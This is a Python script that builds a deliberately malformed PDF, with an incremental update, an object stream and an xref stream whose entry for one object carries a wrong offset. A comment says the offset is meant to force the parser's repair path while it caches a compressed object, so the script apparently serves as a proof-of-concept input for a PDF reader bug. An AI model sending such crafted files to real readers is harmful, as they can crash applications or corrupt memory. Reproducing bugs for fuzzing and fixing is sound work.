import os
from typing import Dict, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        def add_obj(buf: bytearray, num: int, body: bytes) -> int:
            off = len(buf)
            buf += str(num).encode("ascii") + b" 0 obj\n"
            buf += body
            if not body.endswith(b"\n"):
                buf += b"\n"
            buf += b"endobj\n"
            return off

        def add_stream_obj(buf: bytearray, num: int, dict_entries: bytes, stream_data: bytes) -> int:
            off = len(buf)
            buf += str(num).encode("ascii") + b" 0 obj\n"
            buf += b"<<\n"
            buf += dict_entries
            if not dict_entries.endswith(b"\n"):
                buf += b"\n"
            buf += b"/Length " + str(len(stream_data)).encode("ascii") + b"\n"
            buf += b">>\nstream\n"
            buf += stream_data
            if not stream_data.endswith(b"\n"):
                buf += b"\n"
            buf += b"endstream\nendobj\n"
            return off

        def xref_stream_pack_entry(t: int, f1: int, f2: int, w0: int = 1, w1: int = 4, w2: int = 2) -> bytes:
            b = bytearray()
            b += int(t).to_bytes(w0, "big", signed=False)
            b += int(f1).to_bytes(w1, "big", signed=False)
            b += int(f2).to_bytes(w2, "big", signed=False)
            return bytes(b)

        def xref_table_line(off: int, gen: int, inuse: bool) -> bytes:
            return f"{off:010d} {gen:05d} {'n' if inuse else 'f'} \n".encode("ascii")

        pdf = bytearray()
        pdf += b"%PDF-1.5\n%\xff\xff\xff\xff\n"

        offsets: Dict[int, int] = {}

        # Base objects (valid, but will be overridden by incremental xref stream for object 1)
        offsets[1] = add_obj(pdf, 1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
        offsets[2] = add_obj(pdf, 2, b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n")
        offsets[3] = add_obj(
            pdf,
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] /Resources << /Font << /F1 6 0 R >> >> /Contents 4 0 R >>\n",
        )

        content = b"BT /F1 12 Tf 72 200 Td (Hi) Tj ET\n"
        offsets[4] = add_stream_obj(pdf, 4, b"/Filter []\n", content)

        offsets[6] = add_obj(pdf, 6, b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n")

        # Base xref table
        base_xref_off = len(pdf)
        pdf += b"xref\n"
        pdf += b"0 7\n"
        pdf += xref_table_line(0, 65535, False)
        for i in range(1, 7):
            if i in offsets:
                pdf += xref_table_line(offsets[i], 0, True)
            else:
                pdf += xref_table_line(0, 65535, False)
        pdf += b"trailer\n"
        pdf += b"<< /Size 7 /Root 1 0 R >>\n"
        pdf += b"startxref\n"
        pdf += str(base_xref_off).encode("ascii") + b"\n"
        pdf += b"%%EOF\n"

        # Incremental update: object stream containing a new compressed Root (object 1) and resources (object 10)
        pdf += b"\n% incremental update\n"

        obj1_body = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj10_body = b"<< /ProcSet [/PDF /Text] /Font << /F1 6 0 R >> >>"
        obj_data_area = obj1_body + b"\n" + obj10_body
        off_10 = len(obj1_body) + 1
        header = b"1 0 10 " + str(off_10).encode("ascii") + b" "
        first = len(header)
        objstm_data = header + obj_data_area + b"\n"

        offsets[5] = add_stream_obj(
            pdf,
            5,
            b"/Type /ObjStm\n/N 2\n/First " + str(first).encode("ascii") + b"\n",
            objstm_data,
        )

        # XRef stream object (7). We'll generate after knowing its offset.
        xref_stream_off = len(pdf)

        # Build xref stream data (0..10)
        # Intentionally wrong offset for object 5 to force repair/solidify during recursive caching of compressed object 1.
        entries = []
        entries.append(xref_stream_pack_entry(0, 0, 65535))               # 0
        entries.append(xref_stream_pack_entry(2, 5, 0))                    # 1 in objstm 5 index 0
        entries.append(xref_stream_pack_entry(1, offsets[2], 0))           # 2
        entries.append(xref_stream_pack_entry(1, offsets[3], 0))           # 3
        entries.append(xref_stream_pack_entry(1, offsets[4], 0))           # 4
        entries.append(xref_stream_pack_entry(1, 0, 0))                    # 5 WRONG offset (should be offsets[5])
        entries.append(xref_stream_pack_entry(1, offsets[6], 0))           # 6
        entries.append(xref_stream_pack_entry(1, xref_stream_off, 0))      # 7 (self)
        entries.append(xref_stream_pack_entry(0, 0, 65535))               # 8 free
        entries.append(xref_stream_pack_entry(0, 0, 65535))               # 9 free
        entries.append(xref_stream_pack_entry(2, 5, 1))                    # 10 in objstm 5 index 1
        xref_data = b"".join(entries)

        xref_dict = (
            b"/Type /XRef\n"
            b"/Size 11\n"
            b"/W [1 4 2]\n"
            b"/Index [0 11]\n"
            b"/Root 1 0 R\n"
            b"/Prev " + str(base_xref_off).encode("ascii") + b"\n"
        )

        add_stream_obj(pdf, 7, xref_dict, xref_data)

        pdf += b"startxref\n"
        pdf += str(xref_stream_off).encode("ascii") + b"\n"
        pdf += b"%%EOF\n"

        return bytes(pdf)